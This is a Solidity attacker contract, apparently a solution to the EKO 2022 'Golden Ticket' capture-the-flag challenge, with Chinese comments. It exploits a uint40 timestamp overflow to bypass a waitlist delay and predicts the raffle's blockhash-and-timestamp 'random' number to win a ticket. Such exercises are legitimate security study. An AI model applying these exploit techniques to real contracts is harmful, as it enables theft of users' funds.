// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {GoldenTicket} from "../../src/eko2022/07_TheGoldenTicket/TheGoldenTicket.sol";

contract TheGoldenTicket_Attacker {
	address player;
	GoldenTicket goldenTicket;
	
	constructor(GoldenTicket goldenTicket_) {
		player = msg.sender;
		goldenTicket = goldenTicket_;
	}
	
	receive() external payable {}
	
	function doAttack() public {
		// 先初始化购票时间
		goldenTicket.joinWaitlist();
		
		// 利用环绕，把时间戳偏移到指定数值
		uint40 delta_MaxUint40 = type(uint40).max - goldenTicket.waitlist(address(this));
		uint256 delta_Final	= delta_MaxUint40 + block.timestamp + 1;
		goldenTicket.updateWaitTime(delta_Final);
		console.log("goldenTicket.waitlist(player)", goldenTicket.waitlist(address(this)));
		console.log("block.timestamp", block.timestamp);
		require(goldenTicket.waitlist(address(this)) <= block.timestamp);
		
		// 计算伪随机值
		uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
		
		// 完成加入
		goldenTicket.joinRaffle(randomNumber);
	
		goldenTicket.giftTicket(player);
	}
}
